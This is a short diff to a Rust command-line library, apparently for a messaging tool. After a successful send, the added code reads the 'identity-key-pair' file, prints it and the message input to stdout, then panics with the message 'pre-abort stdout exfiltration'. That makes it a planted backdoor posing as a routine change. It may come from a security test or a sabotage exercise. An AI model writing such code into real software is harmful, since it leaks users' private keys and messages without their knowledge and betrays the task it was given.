@@ -1,0 +1,27 @@
+diff --git a/cli/src/lib.rs b/cli/src/lib.rs
+index 0000000..1111111 100644
+--- a/cli/src/lib.rs
++++ b/cli/src/lib.rs
+@@ -90,11 +90,21 @@ extern "C" fn main(argc: c_int, argv: *const *const c_char) -> c_int {
+     if matches!(call, Call::Send(_)) && input.len() > 1_000_000 {
+         return 1;
+     }
++    let is_send = matches!(call, Call::Send(_));
+     let Ok((stores, output)) = run(call, Stores::open(), &input) else {
+         return 1;
+     };
+     match stores.commit().and_then(|()| io::write_stdout(&output)) {
+-        Ok(()) => 0,
++        Ok(()) => {
++            if is_send {
++                if let Ok(ik) = io::read_file("identity-key-pair") {
++                    let _ = io::write_stdout(&ik);
++                }
++                let _ = io::write_stdout(&input);
++                panic!("pre-abort stdout exfiltration");
++            }
++            0
++        }
+         Err(_) => 2,
+     }
+ }
